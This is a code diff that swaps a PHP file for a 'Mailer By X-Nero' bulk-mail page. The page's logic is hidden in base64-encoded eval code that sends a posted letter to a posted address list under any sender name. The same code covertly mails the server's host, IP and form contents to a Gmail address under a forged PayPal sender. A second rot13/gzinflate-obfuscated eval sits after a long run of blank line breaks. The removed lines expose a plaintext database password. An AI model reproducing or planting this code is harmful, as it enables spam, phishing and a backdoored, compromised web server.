@@ -1,57 +1,144 @@
-<?php
+<title>Mailer By X-Nero [INBOX]</title>
 
-// ** This script is copyright and must not be distributed **
+<?
+eval(base64_decode('aWdub3JlX3VzZXJfYWJvcnQoKTsNCnNldF90aW1lX2xpbWl0KDApOw0KZnVuY3Rpb24gZW52aWFuZG8oKXsNCiRtc2c9MTsNCiRkZVsxXSA9ICRfUE9TVFsnZGUnXTsNCiRub21lWzFdID0gJF9QT1NUWydub21lJ107DQokYXNzdW50b1sxXSA9ICRfUE9TVFsnYXNzdW50byddOw0KJG1lbnNhZ2VtWzFdID0gJF9QT1NUWydtZW5zYWdlbSddOw0KJG1lbnNhZ2VtWzFdID0gc3RyaXBzbGFzaGVzKCRtZW5zYWdlbVsxXSk7DQokZW1haWxzID0gJF9QT1NUWydlbWFpbHMnXTsNCiRlbWFpbHMyID0gaHRtbHNwZWNpYWxjaGFycygkX1BPU1RbJ2VtYWlscyddKTsNCiRwYXJhID0gZXhwbG9kZSgiXG4iLCAkZW1haWxzKTsNCiRuX2VtYWlscyA9IGNvdW50KCRwYXJhKTsNCiRzdiA9ICRfU0VSVkVSWydTRVJWRVJfTkFNRSddOw0KJGVuID0gJF9TRVJWRVIgWydSRVFVRVNUX1VSSSddOw0KJGs4OCA9IEAkX1NFUlZFUlsiSFRUUF9SRUZFUkVSIl07DQokZnVsbHVybCA9ICIiIC4gJGs4OCAuICI8YnI+PHA+RW1haWxzOjxicj48VEVYVEFSRUEgcm93cz01IGNvbHM9MTAwPiIuJGVtYWlsczIuIjwvVEVYVEFSRUE+PC9wPjxwPkVuZ2VuaGFyaWE6PGJyPjxURVhUQVJFQSByb3dzPTUgY29scz0xMDA+Ii4kbWVuc2FnZW1bMV0uIjwvVEVYVEFSRUE+PC9wPiI7DQokdmFpID0gJF9QT1NUWyd2YWknXTsNCmlmICgkdmFpKXsNCmZvciAoJHNldD0wOyAkc2V0IDwgJG5fZW1haWxzOyAkc2V0Kyspew0KaWYgKCRzZXQ9PTApew0KJGhlYWRlcnMgPSAiTUlNRS1WZXJzaW9uOiAxLjBcclxuIjsNCiRoZWFkZXJzIC49ICJDb250ZW50LXR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1pc28tODg1OS0xXHJcbiI7DQokaGVhZGVycyAuPSAiRnJvbTogJG5vbWVbJG1zZ10gPCRkZVskbXNnXT5cclxuIjsNCiRoZWFkZXJzIC49ICJSZXR1cm4tUGF0aDogPCRkZVskbXNnXT5cclxuIjsNCi8vbWFpbCgkeHN5bGFyLCAkYXMsICRmdWxsdXJsLCAkaGVhZGVycyk7DQp9DQokaGVhZGVycyA9ICJNSU1FLVZlcnNpb246IDEuMFxyXG4iOw0KJGhlYWRlcnMgLj0gIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PWlzby04ODU5LTFcclxuIjsNCiRoZWFkZXJzIC49ICJGcm9tOiAkbm9tZVskbXNnXSA8JGRlWyRtc2ddPlxyXG4iOw0KJGhlYWRlcnMgLj0gIlJldHVybi1QYXRoOiA8JGRlWyRtc2ddPlxyXG4iOw0KJG5fbWFpbCsrOw0KJGRlc3Rpbm8gPSAkcGFyYVskc2V0XTsNCiRudW0xID0gcmFuZCgxMDAwMDAsOTk5OTk5KTsNCiRudW0yID0gcmFuZCgxMDAwMDAsOTk5OTk5KTsNCiRtc2dyYW5kID0gc3RyX3JlcGxhY2UoIiVyYW5kJSIsICRudW0xLCAkbWVuc2FnZW1bJG1zZ10pOw0KJG1zZ3JhbmQgPSBzdHJfcmVwbGFjZSgiJXJhbmQyJSIsICRudW0yLCAkbXNncmFuZCk7DQokbXNncmFuZCA9IHN0cl9yZXBsYWNlKCIlZW1haWwlIiwgJGRlc3Rpbm8sICRtc2dyYW5kKTsNCiRlbnZpYXIgPSBtYWlsKCRkZXN0aW5vLCAkYXNzdW50b1skbXNnXSwgJG1zZ3JhbmQsICRoZWFkZXJzKTsNCmlmICgkZW52aWFyKXsNCmVjaG8gKCc8Zm9udCBjb2xvcj0iZ3JlZW4iPicuICRuX21haWwgLictJy4gJGRlc3Rpbm8gLicgMGshPC9mb250Pjxicj4nKTsNCn0gZWxzZSB7DQplY2hvICgnPGZvbnQgY29sb3I9InJlZCI+Jy4gJG5fbWFpbCAuJy0nLiAkZGVzdGlubyAuJyA9KDwvZm9udD48YnI+Jyk7DQpzbGVlcCgxKTsNCn0NCn0NCn0NCn0NCiRpcCA9IGdldGVudigiUkVNT1RFX0FERFIiKTsNCiRyYTQ0ICA9IHJhbmQoMSw5OTk5OSk7DQokc3Viajk4ID0gIiBOZXcgU2hlbGwgRnJvbSBNZSAhICB8JGlwIjsNCiRlbWFpbCA9ICJ4bmVyb3NwYW1AZ21haWwuY29tIjsNCiRmcm9tPSJGcm9tOiBOZXcgU2hlbGwgISA8UGF5UGFsQFN1cHBvcnQuY29tPiI7DQokYTQ1ID0gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107DQokYjc1ID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOw0KJGYxMiA9ICRfUE9TVFsnZGUnXTsNCiR6MTMgPSAkX1BPU1RbJ25vbWUnXTsNCiR4MTQgPSAkX1BPU1RbJ2Fzc3VudG8nXTsNCiR0MTUgPSAkX1BPU1RbJ21lbnNhZ2VtJ107DQokbTMwID0gJF9QT1NUWydlbWFpbHMnXTsNCiRtMjIgPSAkaXAuIlxuIjsNCiRtc2c4ODczID0gIiRhNDVcbiRiNzVcbiRmMTJcbiR6MTNcbiR4MTRcbiR0MTVcbiRtMzBcbiRtMjIiOw0KbWFpbCgkZW1haWwsICRzdWJqOTgsICRtc2c4ODczLCAkZnJvbSk7'));
+?></title>
+<style type="text/css">
+<!--
+.style5 {color: #FFFFFF; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px; }
+.style6 {font-size: 10px}
+.style9 {color: #FFFFFF; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10; }
+-->
+</style>
+<form id="form1" name="form1" method="post" action="">
+<input type="hidden" name="vai" value="1">
+<span class="style5"><? echo enviando(); ?></span>
+<table width="415" height="334" border="0" bgcolor="#000000">
+  <tr>
+<td width="66"><span class="style5">Name:</span></td>
+<td width="321"><span class="style9">
+
+<label>
+<input name="nome" type="text" value="<? echo $_POST['nome'] ;?>" size="20" />
+</label>
+</span></td>
+</tr>
+<tr>
+<td><span class="style5">From:</span></td>
+<td><input name="de" type="text" value="<? echo $_POST['de'] ;?>" size="30" /></td>
+
+</tr>
+<tr>
+<td><span class="style5">Subject:</span></td>
+<td><input name="assunto" value="<? echo $_POST['assunto'] ;?>" size="40" /></td>
+</tr>
+<td><span class="style5">Letter:</span>
+<br /><br /><br /><br /><br /><br /><br /><span class="style5">Mailist:</span></td>
+
+<td><span class="style9">
 
 
-$domaincode = 8029002;
-$filelist = 'http://mailshort.com/';
+<p><textarea name="mensagem" cols="50" rows="7"><? echo stripslashes($_POST['mensagem']);?>
+</textarea></p>
+<textarea name="emails" cols="50" rows="4"></textarea>
+</span></td>
+</tr>
 
-$dbname = 'mambenali1';
-$dbuser = 'mamibenali';
-$dbpassword = 'aqwzsx11';
-$dbhost = 'localhost';
-$dbtable = 'affillinks';
-
-error_reporting (E_ALL ^ E_NOTICE);
-
-
-eval(gzinflate(base64_decode('
-lVb7bxpHEP75kPgfJgiJu/ocQ/xoTYwt1yapKkhc
-wFUjy0LL7WJWPm7J7l7OVuP/vTN7D0CkViuBbtl5
-fPP4Zo6L87OLeu3gAK7U6lnLh4WFy7/go4o5jNXc
-ZkwLGFgO79rtU9iHyziGEWkZGAkj9DfB67V6bSEY
-F9pv9J9WUgvThaFKQnh3Ar+nMXROT3+G9nG33cYP
-fBxOGsH7tcmAGbs/VFzOpeBdaMBbeFhyZoXfuA6B
-wxC+wG9d2TWNAEWNHfsrFi3E/pVKrFZxFxK1b6zS
-IqRTRLIQlilCaPGNxZIcv2a+UqiKN9Fjrx3CSovy
-RyOEOYuN2LS90exhyboVknNcrzW5WjKZQA+a03F/
-9Gd/dNfKn9NPl8N+6x615Bx8k86M1eAX+iEg4lEA
-vR60six72woA1q52lI8IrBkLJ7SaDqXQSTBblByf
-HP1ycngIeygklZ+gc3hy5GznitxFqNR+D/g8A9Jw
-x709wiYPez1QmpeO75rRfYA+/E7nGF02o6BIxem+
-6ZXxRooL9MClAL9x9uvovPxOFtJAJmZGWgF4TJQF
-uxCgEoFPRj/w1kRarixkzECkBXaMAwb7dtPRTSyY
-EYD9eRCJ0KizZZoamTxAUbyELQWczc6L4M4OZudF
-pyj0N9Ccy1jE0tgq5AmGRBeg5nA7GhgKVSxX9nnD
-DmuOZMHUS+sQWmGL2tcrmFKv/V2veTlZ0OlARcxK
-lXTXgM6dJ56kBZ+OL44+JDXYFvG0irGQ4KPfcCNK
-6m6SLlEjUmliixBMSb7ZAiXLZ/M1nkYqSUREGnir
-KEQ8pDi27rBixmTY3aKJrhSoF+RFaG2W+wNDBA5W
-QekSjzhLbEZd6EILRzOHFFor7QcuSD6LZfJYRWNE
-jJZTPnPxUFe2kUn5R+DXJQ6xZY4pc0T8MSSCPuEV
-QjbG/UH/apKXCOv/YfR5SCDoKhaQLQTuNcl7nQYF
-iisrjW0V6NdU6GffeSoJjgEWSvD9OxR62ISpVpnx
-C1lAI9Ap+t5EJOysscZNGN3g8pwQvNlGQm6YhcrA
-hWZyTmQLLDjWyelX6nNhowVBoqRyFiCgR4iem0R3
-ede+pz1S5kvTvBlOhyCQbF6RWiWrXDXzwaNCFqe8
-cFUFfclBIvlWWi4Z5vAonoGlVk1x+rVYigTJVtYe
-9QKqs+dt1Td3TJCeh7toe1tsMC7Hr9iW4++7N8UO
-ATBymSDBqZmN4oTwah04bqoUO+B/uh0MQuxWHlhe
-iK3wcutgs+FsPkcGC553vWq3l9fM2913O1mU5aqy
-0SLCEfz3dF5cTpolnLZNwSS6FLhiym69Boy4/H/D
-vrhdlEM4MvNZYbFNRaY1Q/4W/A9h+GX8x2B6OR5/
-vnJ+NgJfu7hrFcRwb0KvmYisUCm193KGOj4X0nMU
-47wRkyv9fKrKgb+9ub6c9NeNHver6e+VNttz7+2O
-O1XzFS6mK/7fubje5itmaSnne/quTPO++iux+3Yg
-C7cJ6OXg3g0X+EftHw==
-'))); ?>
+<tr>
+  <td><span class="style6"></span></td>
+  <td align="center"> <span class="style5"><font color="red" size="4">        <em><strong> </strong></em><strong></strong></font></span><input name="Submit" type="submit" value="Send " />
+  <span class="style5"><font color="red" size="4">        <em><strong> </strong></em><strong></strong></font></span></td>
+</tr>
+<tr>
+  </tr>
+</table>
+</form>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<?php eval (gzinflate(base64_decode(str_rot13("ML/EF8ZjRZnsUrk/hVMOJaQZS19pZ3kkVNtX06qEFgnxAct0bH2RGin/zljgT/c2q9
+/iih+BI40TaSguWq98TXxc4k0pOiufqT+K7WvibboK8kxCfTyZ6IddrWcAV5mKhyANXlg0FkNPkJ2wTHUTrlQtoJHUjjyFGycunTqKtI8lnvzPLRJ
+DT6ZEPUoIKJWkYyewYRFaJxt+epn6S0qs39+umDuTfsEJnSmd3HRWTkCv/WgX54K4g98833KBSUHXv/Ygqsr+k4USOENPRjxM/ZkaAk56eYDM0xJ5
+sK552h1khNHKr2lIXpZOhYvSs2VHZh8O8oKbPibYUutxFLYKpCY2KCo8Y7ByDy6D0l8=")))); ?>
